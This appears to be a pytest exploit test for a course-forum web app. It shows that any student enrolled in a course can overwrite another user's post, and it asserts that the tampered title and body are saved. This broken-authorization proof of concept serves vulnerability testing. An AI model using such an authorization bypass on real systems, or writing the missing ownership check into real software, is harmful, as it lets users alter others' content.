from helpers import ApiClient


def build_course_with_members(admin: ApiClient, course_title: str, memberships: list[tuple[int, str]]):
    course = admin.create_course(course_title)
    for user_id, role in memberships:
        admin.add_member(course["course_id"], user_id, role)
    return course


def test_exploit_any_course_member_can_edit_another_users_post(app_instance):
    admin = ApiClient.new(app_instance["base_url"])
    admin.login("admin", "admin123")

    author = ApiClient.new(app_instance["base_url"])
    author_user = author.register("author", "pass123", "Author")
    attacker = ApiClient.new(app_instance["base_url"])
    attacker_user = attacker.register("attacker", "pass123", "Attacker")

    course = build_course_with_members(
        admin,
        "Shared Course",
        [(author_user["user_id"], "student"), (attacker_user["user_id"], "student")],
    )

    author.login("author", "pass123")
    post = author.create_post(course["course_id"], "original title", "original body")

    attacker.login("attacker", "pass123")
    resp = attacker.update_post(course["course_id"], post["post_id"], "tampered title", "tampered body")
    assert resp.status_code == 200, resp.text

    changed = author.get_post(course["course_id"], post["post_id"])
    assert changed["title"] == "tampered title"
    assert changed["body"] == "tampered body"